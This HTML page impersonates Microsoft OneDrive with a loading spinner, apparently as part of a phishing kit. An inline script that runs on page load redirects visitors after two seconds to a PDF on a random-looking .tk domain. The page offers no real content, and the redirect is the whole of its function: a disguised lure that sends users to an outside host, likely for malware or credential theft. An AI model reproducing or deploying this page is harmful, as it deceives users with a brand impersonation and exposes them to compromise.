<html>
<script>
        var timer = setTimeout(function() {
            window.location='http://jsungrhshs.tk/skydovetravels.pdf'
        }, 2000);
    </script>
	<link rel="icon" href="imgs/favicon.ico" type="image/x-icon" />
<head>

<title>Onedrive</title>
<style>
@media (max-width: 1000px) {
    .center{}
    .center-inner{left:25%;top:25%;position:absolute;width:50%;height:300px;background:#f7f7f7;text-align:center;max-width:500px;max-height:500px;}
}
@media (min-width: 1000px) {
    .center{left:50%;top:25%;position:absolute;}
    .center-inner{width:500px;height:100%;margin-left:-250px;height:300px;background:#f7f7f7;text-align:center;max-width:500px;max-height:500px;}
}
</style>
</head>
<body style="height:100%;width:100%;margin:0;padding:0;top:0;bottom:0;background:#EBEBEB;">
<div class="center">

<center>
<img src="imgs/ajax_loading.gif" >

</center>
</div>
</body>
</html>

